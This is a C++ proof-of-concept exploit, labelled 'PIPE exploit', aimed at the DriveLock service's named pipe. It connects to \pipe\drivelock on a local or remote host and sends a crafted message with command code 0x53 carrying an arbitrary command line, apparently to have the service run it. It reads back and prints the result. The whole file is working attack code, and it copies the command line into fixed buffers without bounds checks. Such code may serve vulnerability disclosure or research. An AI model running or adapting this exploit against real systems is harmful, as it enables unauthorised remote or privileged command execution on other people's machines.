#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

wchar_t DRIVELOCK_PIPE[] = LR"(\pipe\drivelock)";
using buffer_t = std::vector<std::uint8_t>;
constexpr auto PIPE_MSG_SIZE = 0x12362;
constexpr auto EXEC_CMDLINE_OFFSET = 8;

void fastExit(wchar_t* msg, DWORD lastError = GetLastError()) {
    std::wcout << L"!! FASTEXIT - " << msg << L"\n";
    std::wcout << L"LastError: " << lastError << L"\n";
    exit(-1);
}

enum PIPE_CMD : std::uint8_t {
    PING = 5, EXEC = 6, DEF_RUNMPCMD = 0x53
};

struct CommandMessage
{
    PIPE_CMD cmd;
    std::uint8_t _pad[7];
    wchar_t cmdline[4192];
};

struct RunMpCmd_Message
{
    PIPE_CMD cmd;
    std::uint8_t _pad[0x200];
    wchar_t cmdline[0x300];
    std::uint8_t _pad2[0x100];
};

void setup_PM_Commnd(std::vector<std::uint8_t>& msgBuf, std::wstring& cmdline) {
    auto cmdMessage = reinterpret_cast<CommandMessage*>(msgBuf.data());

    cmdMessage->cmd = PIPE_CMD::EXEC;
    wcscpy(cmdMessage->cmdline, cmdline.data());

    std::wcout << L"Using cmdline: -- " << cmdMessage->cmdline << L" --\n";
}

void setup_PM_DEF_RUNMPCMD(std::vector<std::uint8_t>& msgBuf, std::wstring& cmdline) {

    auto cmdMessage = reinterpret_cast<RunMpCmd_Message*>(msgBuf.data());
    cmdMessage->cmd = PIPE_CMD::DEF_RUNMPCMD;
    wcscpy(cmdMessage->cmdline, cmdline.data());
}

int wmain(int argc, wchar_t** argv) {

    std::wstring host(L".");
    std::wstring cmdline;
    if( argc > 2) {
        host = argv[1];
        std::wcout << L"Using host: " << host << L"\n";
    }
    for(auto i = 2; i < argc; i++) {
        cmdline += argv[i];
        if( i+1 != argc) {
            cmdline += L' ';
        }
    }

    std::wstring pipeName = LR"(\\)" + host + DRIVELOCK_PIPE;

    std::wcout << L"------< PIPE exploit >----\n";
    std::wcout << L"Opening pipe: " << pipeName << L"\n";

    auto pipe = CreateFileW(pipeName.data(), GENERIC_READ |GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if( pipe == INVALID_HANDLE_VALUE) {
        fastExit(L"Unable to open pipe");
    }

    buffer_t msgBuf(PIPE_MSG_SIZE, 0);

    setup_PM_DEF_RUNMPCMD(msgBuf,cmdline);

    DWORD written;
    if( !WriteFile(pipe, msgBuf.data(), 2048, &written, nullptr)) {
        fastExit(L"Writefile");
    }

    DWORD read = 0;
    if(!ReadFile(pipe, msgBuf.data(), msgBuf.size(), &read, nullptr)) {
        fastExit(L"Readfile");
    }
    auto tmp = reinterpret_cast<std::uint32_t*>(msgBuf.data());
    std::wcout << "Result: ";
    for(auto i = 0; i < 4; i++)
        std::wcout << tmp[i] << L", ";

    CloseHandle(pipe);

    return 0;
}